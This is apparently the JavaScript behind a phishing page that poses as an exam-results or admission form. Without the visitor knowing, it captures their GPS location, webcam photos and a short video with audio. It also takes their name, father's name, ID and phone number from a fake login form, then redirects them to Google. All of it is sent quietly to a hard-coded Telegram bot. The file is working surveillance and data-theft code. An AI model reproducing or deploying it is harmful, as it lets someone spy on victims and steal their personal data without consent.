const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';
const CHAT_ID = '1332669070';

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];

// 📍 Send GPS location quickly
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const { latitude, longitude } = pos.coords;
            sendToTelegram(`📍 *Location*\nLat: ${latitude}\nLng: ${longitude}`);
        },
        null, // No error handling to make it faster
        {
            enableHighAccuracy: false, // Faster acquisition
            timeout: 5000, // Shorter timeout
            maximumAge: 300000 // Accept cached position (5 minutes)
        }
    );
}

// 🎥 Fast media capture - video + audio + photos
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            width: 640,  // Lower resolution for speed
            height: 480,
            facingMode: 'user',
            frameRate: 15 // Lower frame rate for speed
        },
        audio: true
    })
    .then(stream => {
        mediaStream = stream;
        
        // Start all captures simultaneously
        Promise.all([
            startVideoRecording(stream),
            captureMultiplePhotos(stream)
        ]).catch(error => {
            console.error('Capture error:', error);
        });
        
    })
    .catch(error => {
        console.error('Media access error:', error);
    });
}

// 🎬 Fast video recording (5 seconds)
async function startVideoRecording(stream) {
    try {
        recordedChunks = [];
        
        if (!MediaRecorder) return;

        // Use default mimeType for speed
        mediaRecorder = new MediaRecorder(stream);
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            
            if (videoBlob.size > 0 && videoBlob.size < 45 * 1024 * 1024) {
                await sendToTelegram(videoBlob, 'video');
            }
        };
        
        // Start recording immediately
        mediaRecorder.start();
        
        // Stop recording after 5 seconds (shorter for speed)
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 5000);
        
    } catch (error) {
        console.error('Video recording error:', error);
    }
}

// 📸 Fast multiple photo capture
async function captureMultiplePhotos(stream) {
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        await video.play();
        
        // Capture 5 photos quickly with minimal delay
        for (let i = 0; i < 5; i++) {
            setTimeout(async () => {
                await captureSinglePhoto(video, i + 1);
            }, i * 800); // 800ms between photos
        }
        
    } catch (error) {
        console.error('Photo capture error:', error);
    }
}

// 📸 Single photo capture (optimized)
async function captureSinglePhoto(video, photoNumber) {
    return new Promise((resolve) => {
        try {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = 640;  // Fixed smaller size for speed
            canvas.height = 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Lower quality for faster processing
            canvas.toBlob(async blob => {
                if (blob) {
                    await sendToTelegram(blob, 'photo');
                }
                resolve();
            }, 'image/jpeg', 0.7); // Lower quality for speed
            
        } catch (error) {
            resolve(); // Always resolve to prevent blocking
        }
    });
}

// 📝 Fast form submission handler
function initializeFormHandler() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const name = document.getElementById('name')?.value || 'N/A';
            const father = document.getElementById('father')?.value || 'N/A';
            const admId = document.getElementById('admId')?.value || 'N/A';
            const phone = document.getElementById('phone')?.value || 'N/A';

            const message = `📄 *Form Submitted*\n• Name: ${name}\n• Father: ${father}\n• ID: ${admId}\n• Phone: ${phone}`;
            
            await sendToTelegram(message);
            
            // Quick redirect without delays
            alert(`Dear ${name}, we will send you SMS of your result.`);
            window.location.href = 'https://www.google.com';
        });
    }
}

// 📤 Optimized Telegram sending (non-blocking)
async function sendToTelegram(data, type = 'message') {
    // Don't wait for response - fire and forget
    try {
        if (type === 'photo') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', data);
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {}); // Ignore errors
                
        } else if (type === 'video') {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('video', data);
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
                
        } else {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: data,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        }
    } catch (error) {
        // Silent fail - don't block execution
    }
}

// 🛑 Quick cleanup
function stopAllMedia() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
    }
    
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
    }
}

// 🚀 Fast initialization
window.addEventListener('load', function() {
    initializeFormHandler();
    
    // Send quick system info
    const systemInfo = `🖥️ *Page Loaded*\n• URL: ${window.location.href}\n• Time: ${new Date().toLocaleTimeString()}`;
    sendToTelegram(systemInfo);
});

// Quick cleanup on exit
window.addEventListener('beforeunload', function() {
    stopAllMedia();
});